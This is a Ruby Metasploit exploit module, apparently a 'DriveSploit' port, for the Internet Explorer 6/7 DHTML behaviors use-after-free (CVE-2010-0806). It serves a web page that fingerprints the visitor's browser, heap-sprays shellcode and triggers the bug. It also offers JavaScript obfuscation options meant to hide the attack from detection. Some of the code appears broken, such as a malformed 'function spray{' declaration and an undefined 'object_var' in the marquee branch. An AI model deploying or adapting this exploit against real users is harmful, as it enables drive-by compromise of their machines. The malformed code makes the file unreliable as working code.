##
# $Id: ms10_018_ie_behaviors.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# originally ie_iepeers_pointer.rb
#
# Microsoft Internet Explorer iepeers.dll use-after-free exploit for the Metasploit Framework
#
# Tested successfully on the following platforms:
#  - Microsoft Internet Explorer 7, Windows Vista SP2
#  - Microsoft Internet Explorer 7, Windows XP SP3
#  - Microsoft Internet Explorer 6, Windows XP SP3
#
# Exploit found in-the-wild. For additional details:
# http://www.rec-sec.com/2010/03/10/internet-explorer-iepeers-use-after-free-exploit/
#
# Trancer
# http://www.rec-sec.com
##

#
# DriveSploit: this is drivesploit ported version
#

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer DHTML Behaviors Use After Free',
			'Description'    => %q{
					This module exploits a use-after-free vulnerability within the DHTML behaviors
				functionality of Microsoft Internet Explorer versions 6 and 7. This bug was
				discovered being used in-the-wild and was previously known as the "iepeers"
				vulnerability. The name comes from Microsoft's suggested workaround to block
				access to the iepeers.dll file.

				According to Nico Waisman, "The bug itself is when trying to persist an object
				using the setAttribute, which end up calling VariantChangeTypeEx with both the
				source and the destination being the same variant. So if you send as a variant
				an IDISPATCH the algorithm will try to do a VariantClear of the destination before
				using it. This will end up on a call to PlainRelease which deref the reference
				and clean the object."

				NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',                         # original discovery
					'Trancer <mtrancer[at]gmail.com>', # metasploit module
					'Nanika',                          # HIT2010 IE7 reliable PoC
					'jduck',                           # minor cleanups
                                        'wayne <wayne.armorize@gmail.com>' # armorize folks for drivesploit (drivesploit.org)
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2010-0806' ],
					[ 'OSVDB', '62810' ],
					[ 'BID', '38615' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/981374.mspx' ],
					[ 'URL', 'http://www.avertlabs.com/research/blog/index.php/2010/03/09/targeted-internet-explorer-0day-attack-announced-cve-2010-0806/' ],
					[ 'URL', 'http://eticanicomana.blogspot.com/2010/03/aleatory-persitent-threat.html' ],
					[ 'MSB', 'MS10-018' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ '(Automatic) IE6, IE7 on Windows NT, 2000, XP, 2003 and Vista',
						{
							'Method' => 'automatic'
						}
					],

					[ 'IE 6 SP0-SP2 (onclick)',
						{
							'Method' => 'onclick',
							'Ret' => 0x0C0C0C0C
						}
					],

					# "A great celebration of HIT2010" - http://www.hitcon.org/
					[ 'IE 7.0 (marquee)',
						{
							'Method' => 'marquee',
							'Ret' => 0x0C0C0C0C
						}
					],
				],
			'DisclosureDate' => 'Mar 09 2010',
			'DefaultTarget'  => 0))
	end


	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		print_status("Checking user agent: #{agent}")
		if agent =~ /Windows NT 6\.0/
			mytarget = targets[2]   # IE7 on Vista
		elsif agent =~ /MSIE 7\.0/
			mytarget = targets[2]   # IE7 on XP and 2003
		elsif agent =~ /MSIE 6\.0/
			mytarget = targets[1]   # IE6 on NT, 2000, XP and 2003
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

                print_status("Target selected: #{mytarget.name}")

		mytarget
		
	end


	def on_request_uri(cli, request)
		print_status("processing request")
		if target['Method'] == 'automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		else
			mytarget = target
		end

		print_status("regenerating payload")
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))

		# Set the return\nops
		ret = Rex::Text.to_unescape([mytarget.ret].pack('V'))

		j_id = rand_text_alpha(rand(100) + 1)

		# drivesploit options
		ds_concat_all = datastore['ds_concat_all']
		ds_concat_shellcode = datastore['ds_concat_shellcode']
		ds_random_vars = datastore['ds_random_vars']

		print_status("Drivespoit options: ds_concat_all: #{ds_concat_all}, ds_concat_shellcode: #{ds_concat_shellcode}")
		if ds_concat_shellcode
			print_status("concating shellcode");
			arr = Rex::Exploitation::DriveSploit.obfuscatejs(shellcode, Rex::Exploitation::DriveSploit::STRING_CONCAT)
			shellcode = arr[0]
			shellcode_var = arr[1]
		else
			shellcode = "var shellcoderaw = \"#{shellcode}\";";
			shellcode_var = "shellcoderaw";
		end
		print_status("constructing the exploit")
		# Construct the final page

js = %Q|
function spray{
#{shellcode}
var counter;
var shellcode = unescape(#{shellcode_var});
var memory = new Array();
var slackspace = 0x86000-(shellcode.length*2);
var nops = unescape('#{ret}');
while(nops.length<slackspace/2) { nops+=nops; }
var fillblock = nops.substring(0,slackspace/2);
delete nops;
for(counter=0; counter<270; counter++) {
memory[counter] = fillblock + fillblock + shellcode;
}
}
function bootstrapper(){
spray();
|

		case mytarget['Method']

			when 'onclick'

js += %Q|
var object = document.createElement('body');
object.addBehavior('#default#userData');
document.appendChild(object);
try {
for (counter=0; counter<10; counter++) {
object.setAttribute('s',window);
}
} catch(e){ }
window.status+='';
}
document.getElementById('#{j_id}').onclick();
|

			when 'marquee'
			j_attrib = rand_text_alpha(6);

js += %Q|
for (counter = 1; counter <10; counter ++ ){
#{j_id}.setAttribute("#{j_attrib}",document.location);
}
#{j_id}.setAttribute("#{j_attrib}",document.getElementsByName("style"));
document.location="about:\\u0c0c\\u0c0c\\u0c0c\\u0c0cblank";
}
|

		end
		print_status("processing random variables")
		if ds_random_vars
			print_status("Randomizing variables")
			randomized = Rex::Exploitation::DriveSploit::obfuscatejs(js, Rex::Exploitation::DriveSploit::AUTO_RANDOM_VARS)
			print_status("return from randomizer")
			js = randomized[0]
			functionNames = randomized[1]
			# variableNames = randomized[2]
			print_status("getting function name")
			bootstrapper_var = functionNames['bootstrapper']
		else
			bootstrapper_var = "bootstrapper"
		end

		print_status("processing concat_all obfuscation")
		if ds_concat_all
			print_status("Concating entire javascript")
			arr = Rex::Exploitation::DriveSploit::obfuscatejs(js, Rex::Exploitation::DriveSploit::STRING_CONCAT)
			js = "#{arr[0]} eval(#{arr[1]});"
		end
		# enc = Rex::Exploitation::DriveSploit::obfuscatejs(js, Rex::Exploitation::DriveSploit::FINGERPRINT_DECRYPT, "ie6")
		# js = "var sequence =\"#{enc[2]}\"; var SupCry = \"#{enc[0].chop.gsub(/\n/,'\\\\n')}\"; #{enc[3]} #{enc[4]}  eval(GibberishAES.dec(SupCry, DecodeKey));"
		print_status("javascript processed, generating html")

		case mytarget['Method']

			when 'onclick'

html = %Q|<html><body>
<button id='#{j_id}' onclick='#{bootstrapper_var}();' style='display:none'></button>
<script language='javascript'> #{js} </script></body></html>
|

			when 'marquee'

html = %Q|<html>
<head>
<style type="text/css">
.#{object_var} {behavior: url(#default#userData);}
</style>
</head>
<script> #{js} </script>
<body onload="#{bootstrapper_var}();"></body>
<MARQUEE id="#{j_id}" class="#{object_var}"></MARQUEE>
</html>
|

		end

		print_status("html generated")

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)

	end

end

